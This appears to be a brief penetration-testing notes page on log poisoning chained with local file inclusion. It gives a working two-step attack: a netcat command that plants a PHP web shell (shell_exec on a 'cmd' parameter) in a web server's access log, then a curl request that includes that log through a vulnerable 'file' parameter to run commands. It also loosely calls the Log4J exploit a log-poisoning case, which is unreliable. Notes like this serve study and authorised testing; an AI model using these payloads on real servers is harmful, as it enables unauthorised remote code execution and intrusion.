# Log Poisoning

## Introduction

Log Poisoning is a type of [[File-Inclusion-And-Directory-Traversal]] related attack that seeks to inject the log file of a server with malicious request that include code to then can then be used in an LFI payload. The infamous [[Log4J]] exploit is the famous recent example of Log Poisoning that leads to Remote Code Execution. Simple example being:
```bash
nc -nv $poor_web_server_ip 80
(UNKNOWN) [$poor_web_server_ip] 80 (http) open
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
```

## File Inclusion Code Execution

Vulnerable parameter `?file=` and  `&cmd`

```bash
curl "http://$poor_web_server/menu.php?file=c:\xampp\apache\logs\access.log&cmd=dir"
```